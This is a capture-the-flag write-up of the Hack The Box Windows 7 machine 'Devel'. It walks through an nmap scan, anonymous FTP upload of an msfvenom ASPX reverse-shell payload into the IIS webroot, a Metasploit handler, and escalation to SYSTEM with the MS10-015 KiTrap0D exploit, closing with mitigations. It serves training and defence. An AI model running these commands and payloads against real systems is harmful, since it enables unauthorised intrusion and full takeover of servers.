---
title: "HTB Walkthrough: Devel"
date: 2026-06-12
draft: false
description: "Full walkthrough of the Devel machine from Hack The Box. Easy difficulty, Windows 7 x86. Anonymous FTP with write access to the IIS webroot, ASPX webshell, and escalation to SYSTEM via MS10-015 KiTrap0D."
tags: ["HackTheBox", "Windows", "Easy", "FTP", "IIS", "ASPX", "Webshell", "MS10-015", "KiTrap0D", "PrivEsc", "Metasploit", "devel", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Devel** on Hack The Box. **Easy** difficulty machine running **Windows 7 x86**. Anonymous FTP shares the root directory with the IIS webroot, letting us upload an ASPX webshell and gain remote code execution. We escalate to **NT AUTHORITY\SYSTEM** by exploiting MS10-015 (KiTrap0D), a flaw in the Windows x86 kernel.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                             |
|----------------|--------------------------------------------------------------------|
| **Name**       | Devel                                                              |
| **OS**         | Windows 7 (Build 7600) x86                                         |
| **Difficulty** | Easy                                                               |
| **IP**         | 10.129.13.0                                                        |
| **Techniques** | FTP Write to Webroot · ASPX Webshell · MS10-015 KiTrap0D           |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.13.0
```

```
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

Version scan on open ports:

```bash
nmap -sC -sV -p21,80 10.129.13.0
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM  <DIR>  aspnet_client
| 03-17-17  05:37PM    689  iisstart.htm
| 03-17-17  05:37PM  184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
Service Info: OS: Windows
```

*Open ports:*
- `21` → Microsoft FTP with **anonymous access enabled** — and the listed files are exactly those of IIS
- `80` → Microsoft IIS 7.5

> **💡 Key detail — The critical connection:** The anonymous FTP exposes `iisstart.htm`, `welcome.png`, and `aspnet_client/` — exactly the same files served by IIS 7.5 on port 80. This means the **FTP root directory is the IIS webroot**. If we can write a file via FTP, we can access it from a browser and, since this is IIS with ASP.NET, execute it.

### 1.2 FTP Enumeration

We confirm write permissions and the ASP.NET version:

```bash
ftp 10.129.13.0
# Username: anonymous / No password
```

```
ftp> ls aspnet_client/system_web
03-18-17  02:06AM  <DIR>  2_0_50727
```

The path `aspnet_client/system_web/2.0.50727` confirms the server runs **ASP.NET 2.0**, guaranteeing that `.aspx` files will be interpreted and executed by IIS.

> **💡 Conclusions:** Anonymous FTP with write access to webroot + IIS with ASP.NET = uploading a malicious `.aspx` and visiting it from the browser gives direct RCE.

---

## 2. Exploitation — ASPX Webshell via FTP

### 2.1 Generate the ASPX Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.211 \
  LPORT=1337 \
  -f aspx > devel.aspx
```

We use `windows/meterpreter/reverse_tcp` (32-bit) and not the x64 variant because the subsequent `sysinfo` confirms the system is **x86**. An x64 payload in an x86 process would cause an immediate crash — the payload architecture must match the process architecture.

### 2.2 Upload the Payload to the Webroot

```bash
ftp 10.129.13.0
ftp> put ./devel.aspx
226 Transfer complete.
```

### 2.3 Configure the Listener and Trigger the Payload

```bash
msf6 > use multi/handler
msf6 handler > set payload windows/meterpreter/reverse_tcp
msf6 handler > set LHOST tun0
msf6 handler > set LPORT 1337
msf6 handler > exploit -j
```

We visit the URL of the uploaded file so IIS processes and executes it:

```
http://10.129.13.0/devel.aspx
```

```
[*] Sending stage (196678 bytes) to 10.129.13.5
[*] Meterpreter session 35 opened (10.10.14.211:1337 -> 10.129.13.5:49265)
```

```bash
meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter > sysinfo
Computer     : DEVEL
OS           : Windows 7 (6.1 Build 7600)
Architecture : x86
Domain       : HTB
```

✅ **Meterpreter shell obtained as `IIS APPPOOL\Web`** — no elevated privileges. We need to escalate.

---

## 3. User Flag

```bash
meterpreter > cat C:\\Users\\babis\\Desktop\\user.txt
```

> 🔑 User flag obtained.

---

## 4. Privilege Escalation — MS10-015 KiTrap0D

### 4.1 System Enumeration

We use Metasploit's `local_exploit_suggester` module to identify escalation vectors from the current session:

```bash
msf6 > use post/multi/recon/local_exploit_suggester
msf6 > set SESSION 35
msf6 > run
```

```
[+] exploit/windows/local/bypassuac_eventvwr:         The target appears to be vulnerable.
[+] exploit/windows/local/ms10_015_kitrap0d:          The service is running, but could not be validated.
[+] exploit/windows/local/ms10_092_schelevator:       The service is running, but could not be validated.
[+] exploit/windows/local/ms13_053_schlamperei:       The target appears to be vulnerable.
[+] exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running.
```

The suggester lists 16 potential exploits. We choose **`ms10_015_kitrap0d`** because `bypassuac_eventvwr` — the most attractive — requires the current user to belong to the **Administrators** group to bypass UAC. `IIS APPPOOL\Web` is not a local administrator, so the UAC bypass doesn't apply here. `KiTrap0D`, on the other hand, is a kernel vulnerability that doesn't depend on user permissions.

### 4.2 Escalation Vector Analysis

**MS10-015 KiTrap0D** exploits a flaw in the handling of the divide-by-zero trap (`#DE`, trap 0) by the Windows kernel on **x86** systems. When such an exception occurs from user mode, the kernel doesn't properly validate the process context, allowing overwriting privileged data structures. The exploit injects a payload into an `msiexec.exe` process and leverages this flaw to elevate the execution context to **NT AUTHORITY\SYSTEM**.

```
Normal flow:    #DE exception → kernel handles the trap → returns control to process
Malicious flow: specially crafted #DE exception → x86 kernel validation failure
                → write to privileged structures → injection into msiexec.exe → SYSTEM
```

The vulnerability only affects **x86** systems — on x64 architectures the kernel handles the trap differently and the exploit doesn't work. The `sysinfo` we obtained at foothold confirmed that Devel is x86, which gave us the direct hint.

### 4.3 Exploitation

```bash
msf6 > use exploit/windows/local/ms10_015_kitrap0d
msf6 exploit(ms10_015_kitrap0d) > set LHOST tun0
msf6 exploit(ms10_015_kitrap0d) > set SESSION 35
msf6 exploit(ms10_015_kitrap0d) > run
```

```
[*] Reflectively injecting payload and triggering the bug...
[*] Launching msiexec to host the DLL...
[+] Process 1124 launched.
[*] Reflectively injecting the DLL into 1124...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Meterpreter session 37 opened (10.10.14.211:4444 -> 10.129.13.5:49268)
```

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

✅ **Escalation to SYSTEM completed.**

---

## 5. Root Flag

```bash
meterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt
```

> 🏁 Root flag obtained.

---

## 6. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Nmap detects anonymous FTP with the same files as IIS 7.5 on port 80.
2. **FTP enumeration** → Write access confirmed in webroot; ASP.NET 2.0 active.
3. **ASPX webshell** → `msfvenom` generates x86 payload; `ftp put` uploads it to webroot; visiting the URL triggers the shell → `IIS APPPOOL\Web`.
4. **User flag** → Access to `babis` desktop → `user.txt`.
5. **PrivEsc** → `local_exploit_suggester` → `ms10_015_kitrap0d` → x86 kernel flaw in `#DE` trap → **NT AUTHORITY\SYSTEM** → `root.txt`.

**What I learned from this machine:**

- **When FTP and the web server share a root directory, FTP with write access is RCE.** No need to exploit any web service vulnerability — just upload an executable file and visit it. Identifying this relationship between services during reconnaissance is what makes the machine solve in minutes instead of hours.

- **The target's architecture determines the payload architecture.** An x64 payload in an x86 process doesn't work — it causes a crash. `sysinfo` in Meterpreter or the `Architecture` field in Nmap output is the reference. On Windows this is especially important because many legacy systems are still x86 despite their age.

- **`local_exploit_suggester` is the starting point for PrivEsc on Windows with Meterpreter.** It doesn't replace knowledge, but it dramatically reduces enumeration time by filtering which exploits are applicable to the specific system. Choosing which one to use still requires judgment — in this case, ruling out `bypassuac` due to the user context.

- **MS10-015 only works on x86.** The system architecture affects not only the foothold payload but also the escalation vector. Having `sysinfo` from the very first moment orients the entire PrivEsc phase — in this case, x86 opens KiTrap0D and closes several x64 exploits.

- **Anonymous FTP with write access in production is a critical risk even if the content looks harmless.** The directory exposed on Devel only had a welcome page and some static assets. However, write capability turned that FTP into a full RCE vector. The problem isn't what's in the directory — it's that someone external can add whatever they want.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| Anonymous FTP with write access to webroot | Disable anonymous access in IIS FTP; never map FTP to the webroot |
| IIS executes any uploaded file | Configure IIS not to execute scripts in upload directories; whitelist permitted extensions |
| MS10-015 KiTrap0D | Apply patch KB979682; migrate to a supported OS (Windows 7 EOL since 2020) |
| IIS pool with elevated permissions | Use `ApplicationPoolIdentity` with minimum privilege; don't run pools as SYSTEM or Administrator |
